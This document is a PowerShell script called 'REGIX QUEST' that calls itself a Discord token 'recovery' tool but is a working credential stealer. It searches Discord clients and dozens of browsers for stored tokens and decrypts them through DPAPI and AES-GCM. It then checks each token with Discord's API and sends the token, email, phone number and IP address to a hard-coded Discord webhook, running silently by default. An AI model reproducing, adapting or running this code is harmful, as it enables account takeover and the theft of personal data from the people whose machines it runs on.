#Requires -Version 5.1
<#
.SYNOPSIS
    REGIX QUEST - Advanced Discord Token Recovery Framework (PowerShell edition).
#>

param(
    [Alias('config')]
    [string]$ConfigPath = '',
    [Alias('dry-run')]
    [switch]$DryRun,
    [switch]$Silent
)

$ErrorActionPreference = 'Stop'

$TOKEN_RE = '[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}'
$DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1566520557376245770/J352hfXGdCF4gjYoTtJOW93Arj1e3LxIsYVMdjgCTOMatkj2ZXKhXbirw3vZD-VkEOIE'

$PATHS = [ordered]@{
    'Discord'                = (Join-Path $env:APPDATA 'discord')
    'Discord Canary'         = (Join-Path $env:APPDATA 'discordcanary')
    'Discord PTB'            = (Join-Path $env:APPDATA 'discordptb')
    'Lightcord'              = (Join-Path $env:APPDATA 'Lightcord')
    'Brave'                  = (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data')
    'Brave Beta'             = (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser-Beta\User Data')
    'Brave Nightly'          = (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser-Nightly\User Data')
    'Chrome'                 = (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')
    'Chrome Beta'            = (Join-Path $env:LOCALAPPDATA 'Google\Chrome Beta\User Data')
    'Chrome Dev'             = (Join-Path $env:LOCALAPPDATA 'Google\Chrome Dev\User Data')
    'Chrome SxS'             = (Join-Path $env:LOCALAPPDATA 'Google\Chrome SxS\User Data')
    'Edge'                   = (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')
    'Edge Beta'              = (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge Beta\User Data')
    'Edge Dev'               = (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge Dev\User Data')
    'Edge Canary'            = (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge SxS\User Data')
    'Opera'                  = (Join-Path $env:APPDATA 'Opera Software\Opera Stable')
    'Opera GX'               = (Join-Path $env:APPDATA 'Opera Software\Opera GX Stable')
    'Opera Beta'             = (Join-Path $env:APPDATA 'Opera Software\Opera Beta')
    'Vivaldi'                = (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')
    'Vivaldi Snapshot'       = (Join-Path $env:LOCALAPPDATA 'Vivaldi\Application')
    'Yandex'                 = (Join-Path $env:LOCALAPPDATA 'Yandex\YandexBrowser\User Data')
    'Amigo'                  = (Join-Path $env:LOCALAPPDATA 'Amigo\User Data')
    'Torch'                  = (Join-Path $env:LOCALAPPDATA 'Torch\User Data')
    'Kometa'                 = (Join-Path $env:LOCALAPPDATA 'Kometa\User Data')
    'Orbitum'                = (Join-Path $env:LOCALAPPDATA 'Orbitum\User Data')
    'CentBrowser'            = (Join-Path $env:LOCALAPPDATA 'CentBrowser\User Data')
    '7Star'                  = (Join-Path $env:LOCALAPPDATA '7Star\7Star\User Data')
    'Sputnik'                = (Join-Path $env:LOCALAPPDATA 'Sputnik\Sputnik\User Data')
    'Epic Privacy Browser'   = (Join-Path $env:LOCALAPPDATA 'Epic Privacy Browser\User Data')
    'Uran'                   = (Join-Path $env:LOCALAPPDATA 'uCozMedia\Uran\User Data')
    'Iridium'                = (Join-Path $env:LOCALAPPDATA 'Iridium\User Data')
    'Firefox'                = (Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles')
    'Firefox Dev'            = (Join-Path $env:APPDATA 'Mozilla\Firefox Developer Edition\Profiles')
    'Firefox ESR'            = (Join-Path $env:APPDATA 'Mozilla\Firefox ESR\Profiles')
}

$script:Config = $null
$script:ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $script:ScriptDir) { $script:ScriptDir = (Get-Location).Path }

function Write-Info { param([string]$Message) if (-not $script:SilentMode) { Write-Host $Message } }
function Write-Warn { param([string]$Message) if (-not $script:SilentMode) { Write-Host ("[WARN] " + $Message) -ForegroundColor Yellow } }
function Write-Err { param([string]$Message) if (-not $script:SilentMode) { Write-Host ("[ERROR] " + $Message) -ForegroundColor Red } }

function Set-ConfigDefaults {
    $script:Config = [ordered]@{
        webhook_urls        = @($DEFAULT_WEBHOOK)
        avatar_url         = 'https://i.imgur.com/HmoE29J.png'
        embed_color        = 1752220
        timeout            = 10
        silent_mode        = $true
        dry_run            = $false
        save_to_file       = $true
        backup_file        = 'regix_quest_backup.txt'
        max_threads        = 50
        random_delays      = $true
        min_delay          = 0.01
        max_delay          = 0.05
        webhook_retry_count = 3
        webhook_retry_delay = 2.0
        exe_icon           = 'NONE'
    }
}

function Apply-ConfigJson {
    param($j)
    if ($j.webhook_urls -is [array]) {
        $urls = @()
        foreach ($v in $j.webhook_urls) { if ($v -is [string]) { $urls += $v } }
        if ($urls.Count -eq 0) { $urls = @('') }
        $script:Config.webhook_urls = $urls
    }
    if ($j.avatar_url -is [string]) { $script:Config.avatar_url = $j.avatar_url }
    if ($j.embed_color -is [int]) { $script:Config.embed_color = $j.embed_color }
    if ($j.timeout -is [int]) { $script:Config.timeout = $j.timeout }
    if ($j.silent_mode -is [bool]) { $script:Config.silent_mode = $j.silent_mode }
    if ($j.dry_run -is [bool]) { $script:Config.dry_run = $j.dry_run }
    if ($j.save_to_file -is [bool]) { $script:Config.save_to_file = $j.save_to_file }
    if ($j.backup_file -is [string]) { $script:Config.backup_file = $j.backup_file }
    if ($j.max_threads -is [int]) { $script:Config.max_threads = $j.max_threads }
    if ($j.random_delays -is [bool]) { $script:Config.random_delays = $j.random_delays }
    if ($null -ne $j.min_delay) { $script:Config.min_delay = [double]$j.min_delay }
    if ($null -ne $j.max_delay) { $script:Config.max_delay = [double]$j.max_delay }
    if ($j.webhook_retry_count -is [int]) { $script:Config.webhook_retry_count = $j.webhook_retry_count }
    if ($null -ne $j.webhook_retry_delay) { $script:Config.webhook_retry_delay = [double]$j.webhook_retry_delay }
    if ($j.exe_icon -is [string]) { $script:Config.exe_icon = $j.exe_icon }
}

function Load-Config {
    param([string]$Path)
    Set-ConfigDefaults
    $data = $null
    if ($Path -and (Test-Path -LiteralPath $Path -PathType Leaf)) {
        try { $data = Get-Content -LiteralPath $Path -Raw -Encoding UTF8 } catch { return $false }
    } else {
        $adj = Join-Path $script:ScriptDir 'config.json'
        if (Test-Path -LiteralPath $adj -PathType Leaf) {
            try { $data = Get-Content -LiteralPath $adj -Raw -Encoding UTF8 } catch { $data = $null }
        }
    }
    if ($data) {
        try {
            $j = $data | ConvertFrom-Json
            Apply-ConfigJson $j
        } catch {
            Write-Err "Failed to parse config JSON: $($_.Exception.Message)"
            return $false
        }
    }
    if ($DryRun) { $script:Config.dry_run = $true }
    if ($Silent) { $script:Config.silent_mode = $true }
    $script:SilentMode = [bool]$script:Config.silent_mode
    return $true
}

function Test-Config {
    $ok = $true
    $any = $false
    foreach ($u in $script:Config.webhook_urls) { if ($u) { $any = $true; break } }
    if (-not $any -and -not $script:Config.dry_run) { $ok = $false }
    foreach ($u in $script:Config.webhook_urls) {
        if ($u -and -not ($u.StartsWith('http://') -or $u.StartsWith('https://'))) { $ok = $false }
    }
    if (-not $env:LOCALAPPDATA) { $ok = $false }
    if (-not $env:APPDATA) { $ok = $false }
    return $ok
}

# ---------- Crypto (C# helper) ----------
$csharp = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public static class CryptoHelper {
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, IntPtr ppszDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);

    [StructLayout(LayoutKind.Sequential)]
    struct DATA_BLOB { public uint cbData; public IntPtr pbData; }

    static DATA_BLOB MakeBlob(byte[] data) {
        var b = new DATA_BLOB();
        b.cbData = (uint)data.Length;
        b.pbData = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, b.pbData, data.Length);
        return b;
    }

    public static byte[] GetEncryptionKey(string path) {
        try {
            string localStatePath = Path.Combine(path, "Local State");
            if (!File.Exists(localStatePath)) return null;
            string json = File.ReadAllText(localStatePath);
            int idx = json.IndexOf("\"encrypted_key\"");
            if (idx < 0) return null;
            int colon = json.IndexOf(':', idx);
            int q1 = json.IndexOf('"', colon + 1);
            int q2 = json.IndexOf('"', q1 + 1);
            string b64 = json.Substring(q1 + 1, q2 - q1 - 1);
            byte[] decoded = Convert.FromBase64String(b64);
            if (decoded.Length < 6) return null;
            byte[] enc = new byte[decoded.Length - 5];
            Buffer.BlockCopy(decoded, 5, enc, 0, enc.Length);
            var inBlob = MakeBlob(enc);
            var outBlob = new DATA_BLOB();
            bool ok = CryptUnprotectData(ref inBlob, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob);
            Marshal.FreeHGlobal(inBlob.pbData);
            if (!ok) return null;
            byte[] key = new byte[outBlob.cbData];
            Marshal.Copy(outBlob.pbData, key, 0, (int)outBlob.cbData);
            LocalFree(outBlob.pbData);
            return key;
        } catch { return null; }
    }

    [DllImport("bcrypt.dll")]
    static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, IntPtr pszImplementation, uint dwFlags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, byte[] pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, ref AUTH_INFO pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    struct AUTH_INFO {
        public uint cbSize;
        public uint dwFlags;
        public IntPtr pbNonce;
        public uint cbNonce;
        public IntPtr pbAuthData;
        public uint cbAuthData;
        public IntPtr pbTag;
        public uint cbTag;
        public IntPtr pbMacContext;
        public uint cbMacContext;
        public uint cbAAD;
        public ulong cbData;
        public uint dwErrorStatus;
    }

    public static string DecryptToken(string encryptedToken, byte[] key) {
        try {
            int pos = encryptedToken.IndexOf("dQw4w9WgXcQ:");
            if (pos < 0) return null;
            string b64 = encryptedToken.Substring(pos + 12);
            byte[] decoded;
            try { decoded = Convert.FromBase64String(b64); } catch { return null; }
            if (decoded.Length < 3 + 12 + 16) return null;
            byte[] iv = new byte[12];
            Buffer.BlockCopy(decoded, 3, iv, 0, 12);
            int ctLen = decoded.Length - 3 - 12 - 16;
            byte[] ct = new byte[ctLen];
            Buffer.BlockCopy(decoded, 15, ct, 0, ctLen);
            byte[] tag = new byte[16];
            Buffer.BlockCopy(decoded, decoded.Length - 16, tag, 0, 16);

            IntPtr hAlg;
            uint st = BCryptOpenAlgorithmProvider(out hAlg, "AES", IntPtr.Zero, 0);
            if (st != 0) return null;
            byte[] gcmBytes = Encoding.Unicode.GetBytes("ChainingModeGCM" + "\0");
            BCryptSetProperty(hAlg, "ChainingMode", gcmBytes, (uint)gcmBytes.Length, 0);

            byte[] buf = new byte[4];
            uint cbData = 0;
            BCryptGetProperty(hAlg, "ObjectLength", buf, 4, out cbData, 0);
            uint cbKeyObj = BitConverter.ToUInt32(buf, 0);
            byte[] keyObj = new byte[cbKeyObj];

            IntPtr hKey;
            st = BCryptGenerateSymmetricKey(hAlg, out hKey, keyObj, cbKeyObj, key, (uint)key.Length, 0);
            if (st != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return null; }

            AUTH_INFO info = new AUTH_INFO();
            info.cbSize = (uint)Marshal.SizeOf(typeof(AUTH_INFO));
            info.pbNonce = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, info.pbNonce, iv.Length);
            info.cbNonce = (uint)iv.Length;
            info.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, info.pbTag, tag.Length);
            info.cbTag = (uint)tag.Length;

            byte[] outBuf = new byte[ct.Length];
            uint cbResult = 0;
            st = BCryptDecrypt(hKey, ct, (uint)ct.Length, ref info, null, 0, outBuf, (uint)outBuf.Length, out cbResult, 0);

            Marshal.FreeHGlobal(info.pbNonce);
            Marshal.FreeHGlobal(info.pbTag);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);

            if (st != 0) return null;
            string s = Encoding.UTF8.GetString(outBuf, 0, (int)cbResult);
            while (s.Length > 0 && (s[s.Length-1] == '\0' || s[s.Length-1] == ' ' || s[s.Length-1] == '\r' || s[s.Length-1] == '\n')) {
                s = s.Substring(0, s.Length - 1);
            }
            return s;
        } catch { return null; }
    }
}
'@

try {
    Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction Stop
} catch {
    if ($_.Exception.Message -notmatch 'already exists|duplicate') {
        Write-Err "Failed to compile crypto helper: $($_.Exception.Message)"
        exit 3
    }
}

# ---------- HTTP helpers ----------
function Invoke-Http {
    param([string]$Method, [string]$Url, [string]$Body = '', [int]$Timeout = 10, [hashtable]$Headers = @{})
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.Method = $Method
    $req.Timeout = $Timeout * 1000
    $req.ReadWriteTimeout = $Timeout * 1000
    $req.UserAgent = 'Mozilla/5.0'
    foreach ($k in $Headers.Keys) {
        if ($k -ieq 'Content-Type') { $req.ContentType = $Headers[$k]; continue }
        $req.Headers[$k] = $Headers[$k]
    }
    if ($Body -and -not $req.ContentType) { $req.ContentType = 'application/json' }
    if ($Body) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $req.ContentLength = $bytes.Length
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
    }
    try { $resp = $req.GetResponse() } catch [System.Net.WebException] { $resp = $_.Exception.Response }
    if (-not $resp) { return @{ Status = 0; Body = '' } }
    $status = [int]$resp.StatusCode
    $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $bodyOut = $sr.ReadToEnd()
    $sr.Close()
    $resp.Close()
    return @{ Status = $status; Body = $bodyOut }
}

function Get-Ip {
    $r = Invoke-Http -Method 'GET' -Url 'https://api.ipify.org?format=json' -Timeout $script:Config.timeout
    try { $j = $r.Body | ConvertFrom-Json; if ($j.ip) { return [string]$j.ip } } catch { }
    return 'Unavailable'
}

function Validate-Token {
    param([string]$Token, [int]$Timeout)
    $headers = @{ 'Authorization' = $Token }
    $r = Invoke-Http -Method 'GET' -Url 'https://discord.com/api/v9/users/@me' -Timeout $Timeout -Headers $headers
    if ($r.Status -ne 200) { return $null }
    try { return ($r.Body | ConvertFrom-Json) } catch { return $null }
}

function Send-Webhook {
    param([string]$Url, $Payload, [int]$Timeout)
    $body = $Payload | ConvertTo-Json -Depth 10 -Compress
    $r = Invoke-Http -Method 'POST' -Url $Url -Body $body -Timeout $Timeout -Headers @{ 'Content-Type' = 'application/json' }
    return [int]$r.Status
}

# ---------- File helpers ----------
function Read-FileText { param([string]$Path) try { return [System.IO.File]::ReadAllText($Path) } catch { return '' } }
function Find-LevelDb {
    param([string]$Root)
    $out = @()
    if (-not (Test-Path -LiteralPath $Root)) { return $out }
    try {
        Get-ChildItem -LiteralPath $Root -Recurse -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq 'leveldb' } |
            ForEach-Object { $out += $_.FullName }
    } catch { }
    return $out
}
function Random-Delay {
    if ($script:Config.random_delays) {
        $minMs = [int]($script:Config.min_delay * 1000)
        $maxMs = [int]($script:Config.max_delay * 1000)
        if ($maxMs -le $minMs) { $maxMs = $minMs + 1 }
        $ms = Get-Random -Minimum $minMs -Maximum ($maxMs + 1)
        Start-Sleep -Milliseconds $ms
    }
}
function Is-Chromium { param([string]$Platform) $CHROMIUM_LIST = @('Brave','Chrome','Edge','Opera','Vivaldi','Yandex','Amigo','Torch','Kometa','Orbitum','CentBrowser','7Star','Sputnik','Epic Privacy Browser','Uran','Iridium'); foreach ($c in $CHROMIUM_LIST) { if ($Platform -like "*$c*") { return $true } }; return $false }

# ---------- Token stealers ----------
function Safe-Storage-Steal {
    param([string]$Path, [string]$Platform)
    $tokens = @()
    $p = [System.IO.Path]::GetFullPath($Path)
    $chromium = Is-Chromium $Platform
    $keyPath = if ($chromium) { Split-Path -Parent $p } else { $p }
    $key = [CryptoHelper]::GetEncryptionKey($keyPath)
    if ($chromium -and -not $key) { return $tokens }
    $ldbs = Find-LevelDb $p
    foreach ($ldb in $ldbs) {
        try {
            Get-ChildItem -LiteralPath $ldb -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '\.(log|ldb|sst)$' } | ForEach-Object {
                Random-Delay
                $content = Read-FileText $_.FullName
                $searchPos = 0
                while ($true) {
                    $idx = $content.IndexOf('dQw4w9WgXcQ:', $searchPos)
                    if ($idx -lt 0) { break }
                    $end = $content.IndexOf('"', $idx)
                    if ($end -lt 0) { $end = $content.Length }
                    $match = $content.Substring($idx, $end - $idx)
                    while ($match.EndsWith('\')) { $match = $match.Substring(0, $match.Length - 1) }
                    $searchPos = $idx + 12
                    $dec = [CryptoHelper]::DecryptToken($match, $key)
                    if ($dec) {
                        $dup = $false
                        foreach ($t in $tokens) { if ($t.Token -eq $dec -and $t.Platform -eq $Platform) { $dup = $true; break } }
                        if (-not $dup) { $tokens += [pscustomobject]@{ Token = $dec; Platform = $Platform } }
                    }
                }
            }
        } catch { }
    }
    return $tokens
}

function Simple-Steal {
    param([string]$Path, [string]$Platform)
    $tokens = @()
    $ldbs = Find-LevelDb $Path
    foreach ($ldb in $ldbs) {
        try {
            Get-ChildItem -LiteralPath $ldb -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '\.(log|ldb|sst)$' } | ForEach-Object {
                $content = Read-FileText $_.FullName
                $matches = [regex]::Matches($content, $TOKEN_RE)
                foreach ($m in $matches) {
                    $val = $m.Value
                    while ($val.EndsWith('\')) { $val = $val.Substring(0, $val.Length - 1) }
                    $val = $val.Trim()
                    $dup = $false
                    foreach ($t in $tokens) { if ($t.Token -eq $val -and $t.Platform -eq $Platform) { $dup = $true; break } }
                    if (-not $dup) { $tokens += [pscustomobject]@{ Token = $val; Platform = $Platform } }
                }
            }
        } catch { }
    }
    return $tokens
}

function Firefox-Steal {
    param([string]$Path, [string]$Platform)
    $tokens = @()
    try {
        Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '\.sqlite$' } | ForEach-Object {
            $content = Read-FileText $_.FullName
            $matches = [regex]::Matches($content, $TOKEN_RE)
            foreach ($m in $matches) {
                $val = $m.Value
                while ($val.EndsWith('\')) { $val = $val.Substring(0, $val.Length - 1) }
                $val = $val.Trim()
                $dup = $false
                foreach ($t in $tokens) { if ($t.Token -eq $val -and $t.Platform -eq $Platform) { $dup = $true; break } }
                if (-not $dup) { $tokens += [pscustomobject]@{ Token = $val; Platform = $Platform } }
            }
        }
    } catch { }
    return $tokens
}

function Steal-Cookies {
    param([string]$Path, [string]$Platform)
    $tokens = @()
    $cookiePath = Join-Path $Path 'Network\Cookies'
    if (-not (Test-Path -LiteralPath $cookiePath)) { return $tokens }
    try {
        $content = Read-FileText $cookiePath
        $matches = [regex]::Matches($content, $TOKEN_RE)
        foreach ($m in $matches) {
            $val = $m.Value.Trim()
            $dup = $false
            foreach ($t in $tokens) { if ($t.Token -eq $val -and $t.Platform -eq $Platform) { $dup = $true; break } }
            if (-not $dup) { $tokens += [pscustomobject]@{ Token = $val; Platform = $Platform } }
        }
    } catch { }
    return $tokens
}

function Get-Tokens {
    param([string]$Platform, [string]$Path)
    $tokens = @()
    if (-not (Test-Path -LiteralPath $Path)) { return $tokens }
    if ($Platform -like 'Firefox*') {
        $tokens += Firefox-Steal -Path $Path -Platform $Platform
        return $tokens
    }
    if (Is-Chromium $Platform) {
        $profiles = @()
        if (Test-Path -LiteralPath $Path) {
            try { Get-ChildItem -LiteralPath $Path -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name } } catch { }
        }
        if ($profiles.Count -eq 0) { $profiles = @('Default') }
        # scan root if it contains leveldb
        if (Find-LevelDb $Path) {
            $plat = $Platform
            $tokens += Safe-Storage-Steal -Path $Path -Platform $plat
            $tokens += Simple-Steal -Path $Path -Platform $plat
        }
        foreach ($prof in $profiles) {
            $profPath = Join-Path $Path $prof
            if (Test-Path -LiteralPath $profPath) {
                $plat = "$Platform ($prof)"
                $tokens += Safe-Storage-Steal -Path $profPath -Platform $plat
                $tokens += Simple-Steal -Path $profPath -Platform $plat
                $tokens += Steal-Cookies -Path $profPath -Platform $plat
            }
        }
    } else {
        $tokens += Safe-Storage-Steal -Path $Path -Platform $Platform
        $tokens += Simple-Steal -Path $Path -Platform $Platform
    }
    return $tokens
}

# ---------- Main ----------
function Invoke-Main {
    Set-ConfigDefaults
    $script:SilentMode = $false
    if (-not (Load-Config -Path $ConfigPath)) { exit 1 }
    if (-not (Test-Config)) { Write-Err 'Config validation failed.'; exit 1 }

    Write-Info 'REGIX QUEST - PowerShell Edition'
    Write-Info 'Scanning targets...'

    $foundTokens = @()
    foreach ($kv in $PATHS.GetEnumerator()) {
        $platform = $kv.Key
        $path = $kv.Value
        Write-Info "  -> $platform"
        $res = Get-Tokens -Platform $platform -Path $path
        if ($res) { $foundTokens += $res }
    }

    if (-not $foundTokens -or $foundTokens.Count -eq 0) {
        Write-Info 'No tokens found.'
        exit 2
    }

    $seen = New-Object System.Collections.Generic.HashSet[string]
    $unique = @()
    foreach ($tp in $foundTokens) {
        if ($tp.Token -notmatch $TOKEN_RE) { continue }
        if ($seen.Contains($tp.Token)) { continue }
        [void]$seen.Add($tp.Token)
        $unique += $tp
    }
    if (-not $unique -or $unique.Count -eq 0) {
        Write-Info 'No valid tokens after dedup.'
        exit 2
    }

    Write-Info "Found $($unique.Count) unique token(s)."
    $ip = Get-Ip

    foreach ($tp in $unique) {
        $ud = Validate-Token -Token $tp.Token -Timeout $script:Config.timeout
        if (-not $ud) { continue }
        $username = if ($ud.username) { [string]$ud.username } else { 'Unknown' }
        $disc = if ($ud.discriminator) { [string]$ud.discriminator } else { '0' }
        if (-not $username) { $username = 'Unknown' }
        if (-not $disc) { $disc = '0' }
        $flags = 0
        if ($null -ne $ud.flags) { $flags = [int]$ud.flags }
        $badges = ''
        if ($flags -band 64) { $badges += ':BadgeBravery: ' }
        if ($flags -band 128) { $badges += ':BadgeBrilliance: ' }
        if ($flags -band 256) { $badges += ':BadgeBalance: ' }
        if (-not $badges) { $badges = 'None' }
        $badges = $badges.Trim()

        $avatarUrl = ''
        if ($ud.avatar) { $av = [string]$ud.avatar; if ($av) { $avatarUrl = "https://cdn.discordapp.com/avatars/$($ud.id)/$av.png" } }

        $phoneVal = if ($ud.PSObject.Properties.Name -contains 'phone') {
            $pv = $ud.phone
            if ($null -eq $pv -or [string]$pv -eq '') { '"N/A"' } else { ($pv | ConvertTo-Json -Compress) }
        } else { '"N/A"' }

        $userIdVal = if ($ud.id) { [string]$ud.id } else { 'N/A' }
        $emailVal = if ($ud.email) { [string]$ud.email } else { 'N/A' }

        $embed = [ordered]@{
            username   = 'REGIX QUEST'
            avatar_url = $script:Config.avatar_url
            embeds     = @(
                [ordered]@{
                    title       = "New Discord Token Found: $username#$disc ($($tp.Platform))"
                    color       = $script:Config.embed_color
                    thumbnail   = @{ url = $avatarUrl }
                    fields      = @(
                        @{ name = 'User ID'; value = $userIdVal; inline = $true }
                        @{ name = 'Email'; value = $emailVal; inline = $true }
                        @{ name = 'Phone'; value = $phoneVal; inline = $true }
                        @{ name = 'Flags'; value = [string]$flags; inline = $true }
                        @{ name = 'Badges'; value = $badges; inline = $true }
                        @{ name = 'Platform'; value = $tp.Platform; inline = $true }
                        @{ name = 'IP Address'; value = $ip; inline = $true }
                        @{ name = 'Token'; value = ('```' + $tp.Token + '```'); inline = $false }
                    )
                    footer     = @{ text = 'Developed by REGIX QUEST' }
                }
            )
        }

        if ($script:Config.save_to_file) {
            $backupPath = Join-Path $script:ScriptDir $script:Config.backup_file
            $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
            $usernameOut = if ($username) { $username } else { 'Unknown' }
            $discOut = if ($disc) { $disc } else { '0' }
            $emailOut = if ($ud.email) { [string]$ud.email } else { 'N/A' }
            $line = @()
            $line += "[$ts] $($tp.Platform)"
            $line += "Token: $($tp.Token)"
            $line += "User: $usernameOut#$discOut"
            $line += "Email: $emailOut"
            $line += "IP: $ip"
            $line += ('-' * 80)
            Add-Content -LiteralPath $backupPath -Value $line -Encoding UTF8
        }

        if ($script:Config.dry_run) {
            Write-Info "  [dry-run] token validated for $username#$disc ($($tp.Platform))"
            continue
        }

        foreach ($wurl in $script:Config.webhook_urls) {
            if (-not $wurl) { continue }
            $sent = $false
            for ($attempt = 0; $attempt -lt $script:Config.webhook_retry_count; $attempt++) {
                $st = Send-Webhook -Url $wurl -Payload $embed -Timeout $script:Config.timeout
                if ($st -ge 200 -and $st -lt 300) { $sent = $true; break }
                if ($attempt -lt $script:Config.webhook_retry_count - 1) {
                    $delay = if ($st -eq 429) { 5 } else { [int]$script:Config.webhook_retry_delay }
                    Start-Sleep -Seconds $delay
                }
            }
            if ($sent) { Write-Info "  Delivered to webhook." } else { Write-Warn "  Failed to deliver to webhook (status $st)." }
        }
    }

    Write-Info 'Done.'
}

if ($MyInvocation.InvocationName -ne '.') {
    Invoke-Main
}
